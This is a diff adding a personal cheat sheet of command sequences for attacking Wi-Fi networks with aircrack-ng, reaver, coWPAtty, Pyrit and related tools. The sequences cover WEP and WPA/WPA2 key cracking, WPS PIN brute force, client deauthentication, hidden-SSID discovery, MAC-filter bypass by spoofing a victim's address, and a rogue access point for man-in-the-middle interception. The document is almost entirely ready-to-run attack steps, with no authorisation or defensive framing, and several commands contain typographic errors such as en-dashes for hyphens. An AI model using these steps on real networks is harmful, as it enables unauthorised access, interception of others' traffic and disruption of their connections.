@@ -1,0 +1,225 @@
+My Wifi Cheat Sheet 
+
+
+WEP CRACKINGBIG-WPA-LIST-1
+
+ Method 1 : Fake Authentication Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+#What’s my mac?
+root@bt:~# macchanger --show mon0
+root@bt:~# aireplay-ng -1 0 -a <BSSID> -h <OurMac> -e <ESSID> mon0
+root@bt:~# aireplay-ng -2 –p 0841 –c FF:FF:FF:FF:FF:FF –b <BSSID> -h <OurMac> mon0
+root@bt:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>
+
+Method 2 : ARP Replay Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+#What’s my mac?
+root@bt:~# macchanger --show mon0
+root@bt:~# aireplay-ng -3 –x 1000 –n 1000 –b <BSSID> -h <OurMac> mon0
+root@bt:~# aircrack-ng –b <BSSID> <PCAP_of_FileName>
+
+Method 3 : Chop Chop Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+#What’s my mac?
+root@bt:~# macchanger --show mon0
+root@bt:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> mon0
+root@bt:~# aireplay-ng -4 –b <BSSID> -h <OurMac> mon0
+ #Press ‘y’ ;
+root@bt:~# packetforge-ng -0 –a <BSSID> -h <OurMac> -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+root@bt:~# aireplay-ng -2 –r <FileName2> mon0
+root@bt:~# aircrack-ng <PCAP_of_FileName>
+
+Method 4 : Fragmentation Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+#What’s my mac?
+root@bt:~# macchanger --show mon0
+root@bt:~# aireplay-ng -1 0 –e <ESSID> -a <BSSID> -h <OurMac> mon0
+root@bt:~# aireplay-ng -5 –b<BSSID> -h < OurMac > mon0
+#Press ‘y’ ;
+root@bt:~# packetforge-ng -0 –a <BSSID> -h < OurMac > -k <SourceIP> -l <DestinationIP> -y <XOR_PacketFile> -w <FileName2>
+root@bt:~# aireplay-ng -2 –r <FileName2> mon0
+root@bt:~# aircrack-ng <PCAP_of_FileName>
+
+Method 5 : SKA (Shared Key Authentication) Type Cracking
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# ifconfig mon0 down
+root@bt:~# macchanger –-mac <VictimMac> mon0
+root@bt:~# ifconfig mon0 up
+root@bt:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> mon0
+root@bt:~# aireplay-ng –-deauth 1 –a <BSSID> -h <FakedMac> mon0
+root@bt:~# aircrack-ng <PCAP_of_FileName>
+
+WPA / WPA2 CRACKING
+
+Method 1 : WPS Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# apt-get install reaver
+root@bt:~# wash –i mon0 –C
+root@bt:~# reaver –i mon0 –b <BSSID> -vv –S
+#or, Specific attack
+root@bt:~# reaver –i –c <Channel> -b <BSSID> -p <PinCode> -vv –S
+
+Method 2 : Dictionary Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# aircrack-ng –w <WordlistFile> -b <BSSID> <Handshaked_PCAP>
+
+Method 3 : Crack with John The Ripper
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# cd /pentest/passwords/john
+root@bt:~# ./john –wordlist=<Wordlist> --rules –stdout|aircrack-ng -0 –e <ESSID> -w - <PCAP_of_FileName>
+
+Method 4 : Crack with coWPAtty
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# cowpatty –r <FileName> -f <Wordlist> -2 –s <SSID>
+root@bt:~# genpmk –s <SSID> –f <Wordlist> -d <HashesFileName>
+root@bt:~# cowpatty –r <PCAP_of_FileName> -d <HashesFileName> -2 –s <SSID>
+
+Method 5 : Crack with Pyrit
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# pyrit –r<PCAP_of_FileName> -b <BSSID> -i <Wordlist> attack_passthrough
+root@bt:~# pyrit –i <Wordlist> import_passwords
+root@bt:~# pyrit –e <ESSID> create_essid
+root@bt:~# pyrit batch
+root@bt:~# pyrit –r <PCAP_of_FileName> attack_db
+
+Method 6 : Precomputed WPA Keys Database Attack
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 1 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# kwrite ESSID.txt
+root@bt:~# airolib-ng NEW_DB --import essid ESSID.txt
+root@bt:~# airolib-ng NEW_DB --import passwd <DictionaryFile>
+root@bt:~# airolib-ng NEW_DB --clean all
+root@bt:~# airolib-ng NEW_DB --stats
+root@bt:~# airolib-ng NEW_DB --batch
+root@bt:~# airolib-ng NEW_DB --verify all
+root@bt:~# aircrack-ng –r NEW_DB <Handshaked_PCAP>
+
+FIND HIDDEN SSID
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <Channel> --bssid <BSSID> mon0
+root@bt:~# aireplay-ng -0 20 –a <BSSID> -c <VictimMac> mon0
+
+BYPASS MAC FILTERING
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airodump-ng –c <AP_Channel> --bssid <BSSID> -w <FileName> mon0
+root@bt:~# aireplay-ng -0 10 –a <BSSID> -c <VictimMac> mon0
+root@bt:~# ifconfig mon0 down
+root@bt:~# macchanger –-mac <VictimMac> mon0
+root@bt:~# ifconfig mon0 up
+root@bt:~# aireplay-ng -3 –b <BSSID> -h <FakedMac> mon0
+
+MAN IN THE MIDDLE ATTACK
+
+root@bt:~# airmon-ng start wlan0
+root@bt:~# airbase-ng –e “<FakeBSSID>” mon0
+root@bt:~# brctl addbr <VariableName>
+root@bt:~# brctl addif <VariableName> mon0
+root@bt:~# brctl addif <VariableName> at0
+root@bt:~# ifconfig eth0 0.0.0.0 up
+root@bt:~# ifconfig at0 0.0.0.0 up
+root@bt:~# ifconfig <VariableName> up
+root@bt:~# aireplay-ng –deauth 0 –a <victimBSSID> mon0
+root@bt:~# dhclient3 <VariableName> &
+root@bt:~# wireshark &
+;select <VariableName> interface
+
+
+
+
+
+------- OR ----------------
+
+
+
+
+
+
+
+WEP cracking
+
+– Scan & collect: airodump-ng --bssid TARGETMAC -c CHANNEL --ivs -w dump mon
+– Fake Auth: aireplay-ng -1 0 -e NAME -a TARGETMAC -h FAKEMAC mon0
+aireplay-ng -1 600 -o 1 -q 10 -e NAME -a TARGETMAC -h FAKEMAC mon0
+– Injection: aireplay-ng --arpreplay -b TARGETMAC -h CLIENTMAC mon0
+– Send recived packet: aireplay-ng -2 -p 0841 -c OURMAC -b TARGETMAC -h OURMAC mon0
+– Deauth client: aireplay-ng -0 1 -a TARGETMAC -c CLIENTMAC mon0
+– Cracking: aircrack-ng -b TARGETMAC dump-01.ivs
+
+WPA cracking
+
+– Scan & collect: airodump-ng -a -c CHANNEL --output-format pcap --bssid TARGETMAC -w psk mon0
+( pressing the TAB buttong puts it in select mode, scrolling down the list of AP’s shows up the associated clients )
+( pressing the S button changes the list priority, e.g list by AP, Signal, SSID, Encryption etc.. )
+– Deauth client: aireplay-ng -0 1 -a TARGETMAC -c CLIENTMAC mon0
+( 1 is the number of deauths to send, 0 means send them continuously. In this attack is very important the client PWR )
+– Cracking handshake: aircrack-ng -w passwords.lst psk*.cap
+crunch 10 10 1234567890ABCDEF | aircrack-ng -b TARGETMAC -w - /home/user/psk-01.cap
+( This uses 10 digit hex on a given client taken from the cap file )
+cowpatty -s ESSID -d rainbow-tables/wpa_tables/ESSID -r psk*cap
+( In this case we use rainbow tables )
+
+WPA cracking with GPU
+
+– Cracking handshake: crunch 10 10 0123456789ABCDEF | pyrit -r "/home/user/psk-01.cap" -e "ESSID" -i - attack_passthrough
+( This uses 10 digit hex on a given client taken from the cap file )
+crunch 8 8 0123456789 | pyrit -r "/home/user/psk-01.cap" -e "ESSID" -i - attack_passthrough
+( This uses 8 digit numbers on a given client taken from the cap file )
+pyrit -r "/home/user/psk*.cap" -i "/data/dic/custom.txt" attack_passthrough
+( With predefined custom dictionary )
+
+WPS exploit
+
+– Scan for WPS: wash -i mon0 -C -s
+– Attack with reaver: reaver -i mon0 -b TARGETMAC -vv
+( Some APs block petitions and stay locked, check reaver documentation )
+– Attack with wpscrack: wpscrack.py --iface mon0 --client OURMAC --bssid TARGETMAC --ssid ESSID -v
+
+Misc Commands
+
+– Change MAC: ifconfig wlan0 hw ether NEWMAC
+– Start/Stop monitor mode: airmon-ng start/stop wlan0
+– Extract handshakes from .cap: tshark -r 'psk-01.cap' -R "eapol || wlan.fc.type_subtype == 0x08" -w 'new.cap'
+( This extracts all handshakes and beacon packets from the cap file & creates a new file )
+tshark -r 'psk-01.cap' -R "eapol || wlan_mgt == TARGETMAC" -w 'new.cap'
+( This extracts the handshake and beacon packet of a specified client from the cap file & creates a new file )
+
+
+
+Also 
+
+
+sudo ifconfig wlan0 down
+sudo iwconfig wlan0 mode monitor
+ OR  airmon-ng start wlan0 
+sudo ifconfig wlan0 up
+
+
+WLAN0 Default wifi device on older linux distro's
